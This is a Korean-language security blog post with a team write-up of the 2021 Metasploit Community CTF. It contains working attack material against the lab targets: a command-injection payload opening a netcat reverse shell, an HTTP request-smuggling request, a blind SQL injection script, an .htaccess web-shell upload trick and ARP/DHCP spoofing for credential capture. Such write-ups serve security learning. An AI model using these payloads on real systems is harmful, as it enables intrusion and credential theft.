<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta property="og:type" content="article">
<meta property="og:image" content="http://ufo.stealien.com/assets/og_image.png">
<meta property="og:title" content="STEALIEN Technical Blog">
<meta property="og:description" content="2021 Metasploit Community CTF write-up, review">
<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700&display=swap" rel="stylesheet">
<title>2021 Metasploit Community CTF write-up, review</title>
<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>2021 Metasploit Community CTF write-up, review | STEALIEN Technical Blog</title>
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="2021 Metasploit Community CTF write-up, review" />
<meta name="author" content="김도현" />
<meta property="og:locale" content="ko" />
<meta name="description" content="2021 Metasploit Community CTF write-up, review" />
<meta property="og:description" content="2021 Metasploit Community CTF write-up, review" />
<link rel="canonical" href="http://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review" />
<meta property="og:url" content="http://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review" />
<meta property="og:site_name" content="STEALIEN Technical Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-12-07T01:30:00+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="2021 Metasploit Community CTF write-up, review" />
<script type="application/ld+json">
{"author":{"@type":"Person","name":"김도현"},"headline":"2021 Metasploit Community CTF write-up, review","dateModified":"2021-12-07T01:30:00+09:00","datePublished":"2021-12-07T01:30:00+09:00","description":"2021 Metasploit Community CTF write-up, review","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review"},"url":"http://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name=“naver-site-verification” content=“74a9ec74d48a1ffca92bf9ac4704ba73be9afd65" />
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous"/>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<link rel="stylesheet" href="/assets/css/style.css">

<link href="https://fonts.googleapis.com/css2?family=Nanum+Gothic:wght@400;700;800&display=swap" rel="stylesheet">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/styles/default.min.css">
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/highlight.min.js"></script>

<link href="/assets/css/syntax.css" rel="stylesheet" >


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-06FFJEF76M"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-06FFJEF76M');
</script>
</head>
<body>
	<header>
		<div class="container"></div><div id="header">
    <div class="container" style="display: flex;justify-content: space-between;">
        <a href="/">
            <img
                class="header_image_logo"
                src="/assets/logo.png"
                style="width: 140px; margin: 20px 28px 0px;"
            />
        </a>
        <a href="https://www.stealien.com/" target="_blank" style="font-family: 'NotoSansKR Medium', sans-serif;font-size: 14px;margin-right: 30px; color: #000; line-height: 70px;">스틸리언 홈페이지</a>
    </div>
</div>
</header>
	<section>
		<div>
			<div class="header_image_bg header_image_post" style="background-image: url('/assets/bg.png');">
    <div class="header_image_post_body">
        <div class="container">
            <div class="page-category">R&D</div>
            <div class="page-title">2021 Metasploit Community CTF write-up, review</div>
            <div class="page-summary">
                <div style="float:left;">
                    <img class="page-profile_image" src="/assets/stealien_inverse.png" />
                    <span>김도현</span>
                </div>
                <div style="float:right;" class="page-date">Dec 7, 2021</div>
            </div>
        </div>
    </div>
</div>
<div class="container page-content">
    <h1 id="2021-metasploit-community-ctf-write-up-review">2021 Metasploit Community CTF write-up, review</h1>

<p>PoSTLTimes(PostalTimes + STLCTF)이라는 팀명으로 진행했다.</p>

<hr />

<h2 id="2-of-clubs-black-joker">2 of Clubs, Black Joker</h2>

<blockquote>
  <p>Solver is <strong>Jang Jaehoon</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>20000/tcp 포트로 접근 시, 바이너리를 다운 받을 수 있다. 이 바이너리는 타겟 서버의 20001/tcp와 통신하며 타겟 바이너리의 문제를 해결 시 플래그를 받을 수 있다. <code class="language-plaintext highlighter-rouge">strace</code>를 사용하여 통신하는 규칙을 분석 후, 문제를 해결 할 수 있었다.</p>

<p>바이너리는 서버로부터 <code class="language-plaintext highlighter-rouge">x</code>, <code class="language-plaintext highlighter-rouge">y</code> 좌표 값을 받으며 사용자가 이를 클릭 할 시에 서버로 클릭한 좌표 값을 전송한다. 이를 전부 완수하게 될 경우 플래그를 획득할 수 있다.</p>

<h3 id="easy-challenge">Easy Challenge</h3>

<p><code class="language-plaintext highlighter-rouge">json</code> 형태로 통신한다. 단순히 이 값들을 프로토콜에 맞게 전송 해 주면 된다.</p>

<h3 id="hard-challenge">Hard Challenge</h3>

<p>Binary 형태로 통신한다. 해당 binary 값들을 이용하여 문제를 해결 할 수 있다.</p>

<hr />

<h2 id="2-of-spades">2 of Spades</h2>

<blockquote>
  <p>Solver is <strong>Dohyun Kim (@d0now)</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>443/tcp 포트로 접근 시, <code class="language-plaintext highlighter-rouge">Under Construction!</code>이라는 문구를 발견 할 수 있다. <code class="language-plaintext highlighter-rouge">gobuster</code>를 이용한 directory scanning으로 <code class="language-plaintext highlighter-rouge">/.git/HEAD</code> 폴더를 발견 할 수 있었으며, <code class="language-plaintext highlighter-rouge">GitHacker</code> 프로젝트를 이용하여 레포지토리 정보를 받아 올 수 있다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git cat-file -p 1e4988fd28fdfb4116f7203451e6cf1b6c51ea43
username=root
password=password123
flag_location=3e6f0e21-7faa-429f-8a1d-3f715a520da4.png
</code></pre></div></div>

<p>해당 경로로 접근 시 플래그를 획득할 수 있었다.</p>

<hr />

<h2 id="3-of-clubs">3 of Clubs</h2>

<blockquote>
  <p>Solver is <strong>Dohyun Kim (@d0now)</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>30033/tcp 포트로 접근 시 하나의 ELF 프로그램을 획득 할 수 있다. 이 프로그램은 30034/tcp에서 동작하고 있으며, 프로그램을 분석하여 조건을 만족해 플래그를 획득할 수 있었다.</p>

<p>프로그램은 간단한 stack 기반 계산기였으며, 여타 pwnable의 vm 문제와 같이 접근 시 문제를 쉽게 해결할 수 있다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">OP_LSH</span> <span class="o">=</span> <span class="mh">0xc0</span>
<span class="n">OP_RSH</span> <span class="o">=</span> <span class="mh">0xc1</span>
<span class="n">OP_MUL</span> <span class="o">=</span> <span class="mh">0xd0</span>
<span class="n">OP_DIV</span> <span class="o">=</span> <span class="mh">0xe0</span>
<span class="n">OP_EXT</span> <span class="o">=</span> <span class="mh">0xff</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>

<span class="n">payload</span>  <span class="o">=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x0006</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x0001</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x03</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x6d</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span> <span class="c1"># 0x6d * 0x17 = 2507
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_DIV</span><span class="p">)</span> <span class="c1"># 2507 / 3 = 835
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_MUL</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">OP_EXT</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xadde</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'flag.png'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</code></pre></div></div>

<hr />

<h2 id="3-of-hearts">3 of Hearts</h2>

<blockquote>
  <p>Solver is <strong>Seokchan Yoon (@ch4n3)</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>33337/tcp 포트로 접근 시 웹 서비스가 존재한다. 특정한 패킷을 전송하게 되면 <code class="language-plaintext highlighter-rouge">PHPSESSID</code>를 획득할 수 있고, 이를 이용하여 <code class="language-plaintext highlighter-rouge">/private.php</code>에 접근하여 플래그를 획득할 수 있다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /save.php?first=1 HTTP/1.1
Host: threeofhearts.ctf.net
Content-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Transfer-Encoding: chunked

5f
0

GET /save.php?second=1 HTTP/1.1
Host: threeofhearts.ctf.net
Content-Length: 40
Cookie: 
0

GET /save.php?second=222 HTTP/1.1
X-Access: localhost
</code></pre></div></div>

<hr />

<h2 id="4-of-clubs">4 of Clubs</h2>

<blockquote>
  <p>Solver is <strong>Dohyun Kim (@d0now)</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>15010/tcp로 접근 시 웹 서비스가 존재한다. 회원가입 후 파일을 업로드/다운로드 할 수 있다. 다운로드 한 파일은 <code class="language-plaintext highlighter-rouge">/users/[username]/files/[filename]</code>에 저장 되는데, 아무나 접근이 가능하여 <code class="language-plaintext highlighter-rouge">username</code>과 <code class="language-plaintext highlighter-rouge">filename</code>을 스캐닝하여 플래그를 획득할 수 있었다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://localhost:31337/users/employee/files/ -c "$RACK_SESSION" -a "$USER_AGENT" -t 32 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:31337/users/employee/files/
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] Cookies:                 rack.session=BAh7CUkiD3Nlc3Npb25faWQGOgZFVG86HVJhY2s6OlNlc3Npb246OlNlc3Npb25JZAY6D0BwdWJsaWNfaWRJIkUxYWY3ZDQyN2FiZTEwZTg4YTMwODNmYTdkNzJmMjBlMzZlY2JhZmMwMGU3MTI3OTM2ZmI3NjEzOWE3NTQxNTI0BjsARkkiCWNzcmYGOwBGSSIxM2RLY0tzdGlYRFBzNVBLVllwWXJQOC9oT0t6bWkxQ1hZVmEvOThWTGU2WT0GOwBGSSINdHJhY2tpbmcGOwBGewZJIhRIVFRQX1VTRVJfQUdFTlQGOwBUSSItYzY5NzEzNGFjMTU4OWNmZjcxZjYwNGE3NTg4ZmIxYTJiMTA5MTI2MwY7AEZJIg11c2VybmFtZQY7AEZJIgphRG1pbgY7AFQ%3D--e346362309c00ead4b73f84b2ae76a89edbed0ae
[+] User Agent:              Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
[+] Timeout:                 10s
===============================================================
2021/12/04 12:50:26 Starting gobuster in directory enumeration mode
===============================================================
/fileadmin            (Status: 200) [Size: 169825]
/reports              (Status: 200) [Size: 23]
/upload               (Status: 403) [Size: 13]

===============================================================
2021/12/04 12:53:43 Finished
===============================================================
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">fileadmin</code> 파일이 플래그이다.</p>

<hr />

<h2 id="4-of-diamonds">4 of Diamonds</h2>

<blockquote>
  <p>Solver is <strong>Jaehoon Jang</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>10010/tcp에 열려있는 웹 페이지의 취약점을 이용하여 문제를 해결할 수 있다.</p>

<p>다음과 같이 로그인 시 user account와 관련된 오브젝트의 정보를 획득 할 수 있다.</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">current_account</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">user</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">password</span><span class="dl">""</span><span class="s2">role</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">user</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">created_at</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">2021-12-06T05:01:12.978Z</span><span class="dl">""</span><span class="s2">updated_at</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">2021-12-06T05:01:12.978Z</span><span class="dl">"</span><span class="p">};</span>    
</code></pre></div></div>

<p>회원가입 시 request packet에 role을 추가하여 문제를 해결할 수 있다.</p>

<hr />

<h2 id="4-of-hearts">4 of Hearts</h2>

<blockquote>
  <p>Solver is <strong>Dohyun Kim</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>80/tcp에 접근 시 플래그를 획득할 수 있다.</p>

<hr />

<h2 id="5-of-clubs">5 of Clubs</h2>

<blockquote>
  <p>Solver is <strong>Dohyun Kim</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>15000/tcp에 접근 시 다음과 같이 특정한 명령을 내릴 수 있는 콘솔을 사용할 수 있다.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc localhost 31337

Welcome to the Student Database Management System!
Time is 2021-12-03 18:03:46 +0000.

Pick one of the following options:
1. Create new student record
2. Show student records
3. Update an existing record
4. Delete student record
5. Exit

Input:
</code></pre></div></div>

<p>1번 메뉴를 통해 새로운 student record를 만들고 4번메뉴에서 올바른 student name을 넣어주고 student surname에서 발생하는 command injection 취약점을 이용하여 문제를 해결할 수 있다.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Deleting a student with the following details:
Student name: a
Student surname: a$(nc 172.17.8.84 4444 -e /bin/sh)
Invalid characters entered.

Found student file: a_a$(nc 172.17.8.84 4444 -e /bin/sh).txt
Deleting...
Completed.
</code></pre></div></div>

<hr />

<h2 id="5-of-diamonds">5 of Diamonds</h2>

<blockquote>
  <p>Solver is <strong>YouTaek Lim</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>11111/tcp에 접근 시 로그인 할 수 있는 웹페이지가 나온다. 사용자명은 admin, 패스워드에 postgresql injection을 통해 공격하여 플래그를 획득할 수 있다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=admin&amp;password='or+1=1--+-
</code></pre></div></div>

<p>and also we wrote blind sql injection script for it.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">string</span>

<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>

    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">/login"</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"username=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;password=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span>

    <span class="n">ses</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span>
        <span class="n">method</span><span class="o">=</span><span class="s">'POST'</span><span class="p">,</span>
        <span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span>
        <span class="n">data</span><span class="o">=</span><span class="n">pay</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">}</span>
    <span class="p">)</span>

    <span class="n">pre</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">prepare</span><span class="p">()</span>
    <span class="n">pre</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
    <span class="n">pre</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">pay</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">ses</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">303</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span> <span class="c1"># login failed.
</span>    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">True</span>

<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    
    <span class="n">db_name_len</span> <span class="o">=</span> <span class="mi">8</span>
    <span class="n">db_name</span>     <span class="o">=</span> <span class="s">'postgres'</span>
    <span class="n">table_name</span>  <span class="o">=</span> <span class="s">'registered_users'</span>

    <span class="n">payload_upper</span> <span class="o">=</span> <span class="s">''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))&gt;{}+--'''</span>
    <span class="n">payload_lower</span> <span class="o">=</span> <span class="s">''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))&lt;{}+--'''</span>
    <span class="n">payload_equal</span> <span class="o">=</span> <span class="s">''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))={}+--'''</span>

    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">password</span> <span class="o">=</span> <span class="s">''</span>

    <span class="k">while</span> <span class="ow">not</span> <span class="n">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="s">'admin'</span><span class="p">,</span> <span class="n">payload_equal</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)):</span>

        <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">cmpmin</span> <span class="o">=</span> <span class="mh">0x20</span>
        <span class="n">cmpmid</span> <span class="o">=</span> <span class="mh">0x50</span>
        <span class="n">cmpmax</span> <span class="o">=</span> <span class="mh">0x7f</span>

        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>

            <span class="k">if</span> <span class="n">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="s">'admin'</span><span class="p">,</span> <span class="n">payload_equal</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">cmpmid</span><span class="p">)):</span>
                <span class="n">password</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">cmpmid</span><span class="p">)</span>
                <span class="k">break</span>

            <span class="k">elif</span> <span class="n">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="s">'admin'</span><span class="p">,</span> <span class="n">payload_upper</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">cmpmid</span><span class="p">)):</span>
                <span class="n">cmpmin</span> <span class="o">=</span> <span class="n">cmpmid</span> <span class="o">+</span> <span class="mi">1</span>
                <span class="n">cmpmid</span> <span class="o">=</span> <span class="p">(</span><span class="n">cmpmax</span> <span class="o">+</span> <span class="n">cmpmin</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>

            <span class="k">elif</span> <span class="n">login</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="s">'admin'</span><span class="p">,</span> <span class="n">payload_lower</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">cmpmid</span><span class="p">)):</span>
                <span class="n">cmpmax</span> <span class="o">=</span> <span class="n">cmpmid</span> <span class="o">-</span> <span class="mi">1</span>
                <span class="n">cmpmid</span> <span class="o">=</span> <span class="p">(</span><span class="n">cmpmax</span> <span class="o">+</span> <span class="n">cmpmin</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>

            <span class="k">else</span><span class="p">:</span>
                <span class="k">raise</span> <span class="nb">RuntimeError</span>

        <span class="k">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">password</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--host"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">"localhost"</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--port"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">31337</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">run</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"password: "</span> <span class="o">+</span> <span class="n">result</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
</code></pre></div></div>

<p>and noticed that admin password is keep changing when revert machine.</p>

<hr />

<h2 id="7-of-hearts">7 of Hearts</h2>

<blockquote>
  <p>Solver is <strong>Dohyun Kim (@d0now)</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>15122/tcp로 ssh를 이용하여 접근 할 수 있다. 다만 아무런 credential이 없어서 로그인 하기 위해 몇가지 방법을 시도 해 보았다:</p>

<ol>
  <li>Dictionary based brute focing attack</li>
  <li>Rule based brute forcing attach (root, 1 length word to 3 length word.)</li>
  <li>Credential stuffing (credentials are from other challeges.)</li>
  <li>Internal network access via other challenge’s reverse shell (maybe docker-compose)</li>
  <li>Packet capture</li>
</ol>

<p>하지만 이 중 아무런 성과를 얻지 못했고, 다음과 같이 상황이 흘러가게 되었다.</p>

<ol>
  <li><strong>Jaehoon Jang</strong>님이 DHCP client port가 열려 있는것을 확인 했다 (근데 분명 처음 스캐닝 돌릴 때는 열려있지 않았다.)</li>
  <li>DHCP client를 속여서 공격하거나, 1-day exploit을 시도 하려고 했다.</li>
  <li>몇가지 시도 도중, 타겟 서버의 ip를 kali의 ip로 변경시키려는 시도를 했다. 참고로 arp spoofing, dhcp spoofing 등을 수행했다.</li>
  <li>패킷 캡쳐를 수행 했다.</li>
  <li>그러자 3~5분 간격으로 kali의 23번 포트에 문제 서버에서 접근하는것을 발견했다.</li>
  <li>kali의 23/tcp에 telnet 서비스를 열어두고 패킷 캡쳐를 수행했다.</li>
  <li>로그인 정보를 획득할 수 있었다.</li>
  <li>성공적으로 ssh login에 성공했다.</li>
</ol>

<p>정말로 당황스러운 문제가 아닐 수 없다… 이 문제 때문에 2등, 3등을 놓쳤다니, 아직도 화가 나는건 사실이다 :(</p>

<hr />

<h2 id="8-of-clubs">8 of Clubs</h2>

<blockquote>
  <p>Solved by <strong>sickcodes</strong> from <strong>PostalTimes</strong></p>
</blockquote>

<p>20123/tcp로 ssh를 이용하여 접근할 수 있다. <code class="language-plaintext highlighter-rouge">encrypt_flag.py</code>와 <code class="language-plaintext highlighter-rouge">encrypted_flag</code> 파일이 존재한다. <code class="language-plaintext highlighter-rouge">encrypt_flag.py</code> 42번줄의 <code class="language-plaintext highlighter-rouge">return fernet.encrypt(file)</code>을 <code class="language-plaintext highlighter-rouge">return fernet..decrypt()</code>로 수정한 후 다음과 같이 문제를 해결할 수 있었다:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python encrypt_flag.py encrypted_flag out --debug
$ file out
out: PNG image data, 500 x 700, 8-bit/color RGBA, non-interlaced
</code></pre></div></div>

<hr />

<h2 id="9-of-diamonds">9 of Diamonds</h2>

<blockquote>
  <p>Solved by <strong>Jaehon Jang</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>8080/tcp로 http를 이용하여 접근할 수 있다. admin cookie를 변조하여 문제를 해결할 수 있었다.</p>

<hr />

<h2 id="9-of-spades">9 of Spades</h2>

<blockquote>
  <p>Solved by <strong>timwr</strong> from <strong>PostalTimes</strong></p>
</blockquote>

<p>20055/tcp로 http를 이용하여 접근할 수 있다. 파일 업로드를 할 수 있는데, 많은 필터링이 존재한다. 하지만 <code class="language-plaintext highlighter-rouge">.htaccess</code> 파일을 업로드하여 <code class="language-plaintext highlighter-rouge">.htm</code> 파일이 php 실행이 가능하도록 수정한 후, <code class="language-plaintext highlighter-rouge">.htm</code> 웹쉘을 업로드하여 문제를 해결할 수 있었다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AddType application/x-httpd-php .html .htm
</code></pre></div></div>

<hr />

<h2 id="10-of-clubs">10 of Clubs</h2>

<blockquote>
  <p>Solved by <strong>Dohyun Kim (@d0now)</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>12380/tcp에 http로 접근이 가능하다. http 버전이 <code class="language-plaintext highlighter-rouge">CVE-2021-41773</code>에 취약하여 이를 이용하여 RCE를 할 수 있었다.</p>

